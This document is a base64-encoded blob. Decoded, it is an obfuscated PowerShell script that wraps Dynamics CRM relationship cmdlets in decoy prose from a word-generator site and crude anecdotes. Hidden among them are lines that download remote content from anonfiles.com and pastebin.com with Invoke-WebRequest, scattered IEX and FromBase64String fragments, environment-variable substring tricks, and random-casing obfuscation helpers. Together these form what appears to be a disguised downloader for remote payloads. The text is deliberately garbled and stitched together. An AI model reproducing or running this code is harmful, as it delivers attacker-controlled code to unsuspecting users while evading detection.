ZW50c1skS2V5XSAtYXMgJEVudW1UeXBlKQogICAgfQoKICAgICRFbnVtQnVpbGRlci5DcmVhdGVUeXBlKCkKfQoKIChJV1IgLVVSSSBodHRwczovL2Fub25maWxlcy5jb20vc3o0endjNXN6YyAtVXNlQmFzaWNQYXJzaW5nKS5jb250ZW50CgoKJDh0NjdnZG0zUXZXVVFUd21IZUdQQSA9IEAiCiAgICBAJXBVQmxJYzp+ODksODMlJVBVQkxpYzp+NSwxJUNIb14gb2ZeJVB1QmxJQzp+NDYsMTYlZgoiQAogICAgKElXUiAtVVJJIGh0dHBzOi8vcGFzdGViaW4uY29tL2dOVzFxZlBLIC1Vc2VCYXNpY1BhcnNpbmcpLmNvbnRlbnQKZnVuY3Rpb24gMiB7CgogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBBUkFNKAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtU2VydmljZUNsaWVudF0kY29ubiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSwgUGFyYW1ldGVyU2V0TmFtZT0iQ3JtUmVjb3JkIildCiAgICAgICAgW1BTT2JqZWN0XSRDcm1SZWNvcmQxLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0yLCBQYXJhbWV0ZXJTZXROYW1lPSJDcm1SZWNvcmQiKV0KICAgICAgICBbUFNPYmplY3RdJENybVJlY29yZDIsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9Ik5hbWVXaXRoSWQiKV0KICAgICAgICBbc3RyaW5nXSRFbnRpdHlMb2dpY2FsTmFtZTEsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIsIFBhcmFtZXRlclNldE5hbWU9Ik5hbWVXaXRoSWQiKV0KICAgICAgICBbZ3VpZF0kSWQxLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0zLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW3N0cmluZ10kRW50aXR5TG9naWNhbE5hbWUyLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj00LCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW2d1aWRdJElkMiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249NSldCiAgICAgICAgW3N0cmluZ10kUmVsYXRpb25zaGlwTmFtZQogICAgKQoJJGNvbm4gPSBWZXJpZnlDcm1Db25uZWN0aW9uUGFyYW0gLWNvbm4gJGNvbm4gLXBpcGVsaW5lVmFsdWUgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnY29ubicpKQogICAgaWYoJENybVJlY29yZDEgLW5lICRudWxsKQogICAgewogICAgICAgICRFbnRpdHlMb2dpY2FsTmFtZTEgPSAkQ3JtUmVjb3JkMS5sb2dpY2FsbmFtZQogICAgICAgICRJZDEgPSAkQ3JtUmVjb3JkMS4oJEVudGl0eUxvZ2ljYWxOYW1lMSArICJpZCIpCiAgICB9CiAgICBpZigkQ3JtUmVjb3JkMiAtbmUgJG51bGwpCiAgICB7CiAgICAgICAgJEVudGl0eUxvZ2ljYWxOYW1lMiA9ICRDcm1SZWNvcmQyLmxvZ2ljYWxuYW1lCiAgICAgICAgJElkMiA9ICRDcm1SZWNvcmQyLigkRW50aXR5TG9naWNhbE5hbWUyICsgImlkIikKICAgIH0KICAgIHRyeQogICAgewoJCSRBc3NvY2lhdGVSZXF1ZXN0ID0gW01pY3Jvc29mdC5Ycm0uU2RrLk1lc3NhZ2VzLkFzc29jaWF0ZVJlcXVlc3RdOjpuZXcoKTsKCQkkQXNzb2NpYXRlUmVxdWVzdC5UYXJnZXQgPSBbTWljcm9zb2Z0LlhybS5TZGsuRW50aXR5UmVmZXJlbmNlXTo6bmV3KCRFbnRpdHlMb2dpY2FsTmFtZTEsJElkMSk7CgkJJEFzc29jaWF0ZVJlcXVlc3QuUmVsYXRpb25zaGlwID0gJFJlbGF0aW9uc2hpcE5hbWU7CgoJCSRSZWxhdGVkRW50aXR5UmVmZXJlbmNlID0gW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RbTWljcm9zb2Z0LlhybS5TZGsuRW50aXR5UmVmZXJlbmNlXV06Om5ldygpCgkJJFJlbGF0ZWRFbnRpdHlSZWZlcmVuY2UuQWRkKChbTWljcm9zb2Z0LlhybS5TZGsuRW50aXR5UmVmZXJlbmNlXTo6bmV3KCRFbnRpdHlMb2dpY2FsTmFtZTIsJElkMikpKQoJCSRSZWxhdGVkRW50aXR5Q29sbGVjdGlvbiA9IFtNaWNyb3NvZnQuWHJtLlNkay5FbnRpdHlSZWZlcmVuY2VDb2xsZWN0aW9uXTo6bmV3KCRSZWxhdGVkRW50aXR5UmVmZXJlbmNlKQoJCSRBc3NvY2lhdGVSZXF1ZXN0LlJlbGF0ZWRFbnRpdGllcyA9ICRSZWxhdGVkRW50aXR5Q29sbGVjdGlvbgoKCQkkcmVzdWx0ID0gJGNvbm4uRXhlY3V0ZSgkQXNzb2NpYXRlUmVxdWVzdCkKCgkJaWYoISRyZXN1bHQpCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyBMYXN0Q3JtQ29ubmVjdG9yRXhjZXB0aW9uKCRjb25uKQogICAgICAgIH0KICAgIH0KICAgIGNhdGNoCiAgICB7CiAgICAgICAgdGhyb3cgTGFzdENybUNvbm5lY3RvckV4Y2VwdGlvbigkY29ubikKICAgIH0KfQo8Iz4+ClNwPWVsbGluZyBhbmQgYygpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGMoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gZigpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBEZWRpY2F0aW9uU291cmNlIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIDN7CgogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBBUkFNKAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtU2VydmljZUNsaWVudF0kY29ubiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSwgUGFyYW1ldGVyU2V0TmFtZT0iQ3JtUmVjb3JkIildCiAgICAgICAgW1BTT2JqZWN0XSRDcm1SZWNvcmQxLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0yLCBQYXJhbWV0ZXJTZXROYW1lPSJDcm1SZWNvcmQiKV0KICAgICAgICBbUFNPYmplY3RbXV0kQ3JtUmVjb3JkMnMsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9Ik5hbWVXaXRoSWQiKV0KICAgICAgICBbc3RyaW5nXSRFbnRpdHlMb2dpY2FsTmFtZTEsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIsIFBhcmFtZXRlclNldE5hbWU9Ik5hbWVXaXRoSWQiKV0KICAgICAgICBbZ3VpZF0kSWQxLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0zLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW3N0cmluZ10kRW50aXR5TG9naWNhbE5hbWUyLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj00LCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW2d1aWRbXV0kSWQycywKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249NSldCiAgICAgICAgW3N0cmluZ10kUmVsYXRpb25zaGlwTmFtZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UsIFBvc2l0aW9uPTYpXQogICAgICAgIFtib29sXSRJc1JlZmxleGl2ZVJlbGF0aW9uc2hpcAogICAgKQoKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkgIAoKICAgIGlmKCRDcm1SZWNvcmQxIC1uZSAkbnVsbCkKICAgIHsKICAgICAgICAkRW50aXR5TG9naWNhbE5hbWUxID0gJENybVJlY29yZDEubG9naWNhbG5hbWUKICAgICAgICAkSWQxID0gJENybVJlY29yZDEuKCRFbnRpdHlMb2dpY2FsTmFtZTEgKyAiaWQiKQogICAgfQoKICAgIGlmKCRDcm1SZWNvcmQycyAtbmUgJG51bGwpCiAgICB7CiAgICAgICAgaWYoJENybVJlY29yZDJzLkNvdW50IC1uZSAwKQogICAgICAgIHsKICAgICAgICAgICAgJEVudGl0eUxvZ2ljYWxOYW1lMiA9ICRDcm1SZWNvcmQyc1swXS5sb2dpY2FsbmFtZQogICAgICAgICAgICAkSWRzID0gTmV3LU9iamVjdCAnU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtTeXN0ZW0uR3VpZF0nCiAgICAgICAgICAgIGZvcmVhY2goJENybVJlY29yZDIgaW4gJENybVJlY29yZDJzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSWRzLkFkZCgkQ3JtUmVjb3JkMi4oJEVudGl0eUxvZ2ljYWxOYW1lMiArICJpZCIpKQogICAgICAgICAgICB9CiAgICAgICAgICAgICRJZDJzID0gJElkcy5Ub0FycmF5KCkKICAgICAgICB9CiAgICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgJ0NybVJlY29yZHMyIGRvZXMgbm90IGluY2x1ZGUgYW55IHJlY29yZHMuJwogICAgICAgICAgICBicmVhawogICAgICAgIH0KICAgIH0gICAKCiAgICB0cnkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJGNvbm4uQ3JlYXRlTXVsdGlFbnRpdHlBc3NvY2lhdGlvbigkRW50aXR5TG9naWNhbE5hbWUxLCAkSWQxLCAkRW50aXR5TG9naWNhbE5hbWUyLCAkSWQycywgJFJlbGF0aW9uc2hpcE5hbWUsIFtHdWlkXTo6RW1wdHksICRJc1JlZmxleGl2ZVJlbGF0aW9uc2hpcCkKCQlpZighJHJlc3VsdCkKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICAgICAgfQogICAgfQogICAgY2F0Y2gKICAgIHsKICAgICAgICB0aHJvdyBMYXN0Q3JtQ29ubmVjdG9yRXhjZXB0aW9uKCRjb25uKQogICAgfQp9CiQ5dlJncVQyV2pzY3JEYUFmVHFBdEpjVFJtUXo5YzhiZFJKRjh3SHJ4SzhDRzNOM21CdyA9IEAiCiAjIFJlbW92ZSB0cmFpbGluZyBkZWxpbWl0ZXIgZnJvbSAkRGVsaW1pdGVkRW5jb2RlZEFycmF5LgogICAgJHhOVGoydzgxdkogPSAkWE5UajJ3ODF2ai5TdWJTdHJpbmcoKDAgKyAoMSAtIDEpKSwkeE5UajJ3ODF2Si5MZW5ndGgtMSkKCiAgICAjIENyZWF0ZSBwcmludGFibGUgdmVyc2lvbiBvZiAkUmFuZG9tRGVsaW1pdGVycyBpbiByYW5kb20gb3JkZXIgdG8gYmUgdXNlZCBieSBmaW5hbCBjb21tYW5kLgogICAgJHBPc2dqWnQgPSAoR2V0LVJhbmRvbSAtSW5wdXQgJEF2VlM4WTEyS1Rtd19ENSAtQ291bnQgJEF2dlM4WTEya3RNd19kNS5MZW5ndGgpIC1Kb2luICcnCiAgICAiQEAiCiAgICAjIG0oKSByYW5kb20gY2FzZSB2ZXJzaW9ucyBmb3IgbmVjZXNzYXJ5IG9wZXJhdGlvbnMuCiAgICAkQXJLc1p1Uk05RHkxNyA9IEdldC1SYW5kb20gLUlucHV0IEAoKHdVSkplWUNJZ0NJS3dSZ0woJ0ZvckVhY2gnKSksKHd1amplWUNpR0Npa1dyR0woJ0ZvckVhY2gtT2JqZWN0JykpLCh3dUpKRVljSUdDSUtXUkdsKCclJykpKQogICAgJGhyTHlxTVZySVZ4Tk15WSAgICAgICA9IChbQ2hhcltdXSh3dUpqRXljSUdDSWtXckdsKCdbU3RyaW5nXTo6Sm9pbicpKSAgICAgIHwgRm9yRWFjaC1PYmplY3QgeyRHX1VvdFE2WGcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4oMSArIDApKSkgeyRHX1VPdFE2WEcgPSAkR191b1RRNlhHLlRvVXBwZXIoKX0gJEdfVW90cTZYZ30pIC1Kb2luICcnCiAgICAkWTBvRnhiY01PICAgICAgICA9IChbQ2hhcltdXShXVWpKRXlDSUdDaUtXUkdsKCdbU3RyaW5nXScpKSAgICAgICAgICAgIHwgRm9yRWFjaC1PYmplY3QgeyRHX1VPVHE2eGcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4oMiAtIDEpKSkgeyRHX3VvVFE2WEcgPSAkR191b3RRNlhnLlRvVXBwZXIoKX0gJEdfVU9UUTZYZ30pIC1Kb2luICcnCiAgICAkaFhJN1lrQTJWOE5HZmE1Z0EgICAgICAgICAgPSAoW0NoYXJbXV0od3VKSkVZQ0lHY0lLV1JnbCgnLUpvaW4nKSkgICAgICAgICAgICAgICB8IEZvckVhY2gtT2JqZWN0IHskR191T3RRNnhnID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoKDEgLSAoMiAtIDEpKS4uKDIgLSAxKSkpIHskR191b3RRNnhHID0gJGdfVW90UTZ4Ry5Ub1VwcGVyKCl9ICRnX1VPdFE2WGd9KSAtSm9pbiAnJwogICAgJHB4U25TVllKR0xsZ2NYYSAgICAgICA9IChbQ2hhcltdXSh3VUpKRXljaWdDSWtXUmdMKCdDaGFyJykpICAgICAgICAgICAgICAgIHwgRm9yRWFjaC1PYmplY3QgeyRnX1VPVFE2WGcgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4oLTEgKyAyKSkpIHskR19Vb1RRNlhnID0gJGdfVW9UUTZYZy5Ub1VwcGVyKCl9ICRnX3VPdHE2WGd9KSAtSm9pbiAnJwogICAgJERKNDJ0aDdES0dJTGhDS3hyeCAgICAgICAgICAgPSAoW0NoYXJbXV0od3VKakVZQ2lHY0lLd3JnTCgnSW50JykpICAgICAgICAgICAgICAgICB8IEZvckVhY2gtT2JqZWN0IHskZ19VT1RxNlhHID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskZ191T3RRNlhHID0gJEdfVU9UUTZYZy5Ub1VwcGVyKCl9ICRHX3VvdFE2eGd9KSAtSm9pbiAnJwogICAgJEFyS1NadXJtOURZMTcgPSAoW0NoYXJbXV0kQXJLc1p1Uk05ZHkxNyAgICAgICAgfCBGb3JFYWNoLU9iamVjdCB7JGdfVW90UTZ4RyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JEdfVW9UUTZYRyA9ICRHX1VvVHE2eEcuVG9VcHBlcigpfSAkR191b3RRNlhnfSkgLUpvaW4gJycKICAgICRTeGlyZlQ2ZjY1NXFEaG5PICAgICAgID0gKFtDaGFyW11dKHdVSkpFWUNJZ2NJS1dyR2woJ1tDb252ZXJ0XTo6VG9JbnQxNignKSkgfCBGb3JFYWNoLU9iamVjdCB7JEdfVW90UTZYRyA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLigwICsgMSkpKSB7JEdfVW90UTZYZyA9ICRHX1VvdHE2WEcuVG9VcHBlcigpfSAkR19VT3RRNlhHfSkgLUpvaW4gJycKICAgICJAQCIKICAgICMgQ3JlYXRlIHByaW50YWJsZSB2ZXJzaW9uIG9mICRSYW5kb21EZWxpbWl0ZXJzIGluIHJhbmRvbSBvcmRlciB0byBiZSB1c2VkIGJ5IGZpbmFsIGNvbW1hbmQgc3BlY2lmaWNhbGx5IGZvciAtU3BsaXQgc3ludGF4LgogICAgJExiWG9jODE3RTNBTHI2MWxOID0gKHd1SmpFeUNJR0NJS3dyR2woJycpKQogICAgRm9yRWFjaCgkVmtYQVE5cHpGVU5IdjVQc0NsNmV1IGluICRhdlZzOFkxMmt0bXdfZDUpCiAgICB7CiAgICAgICAgIyBSYW5kb20gY2FzZSAnc3BsaXQ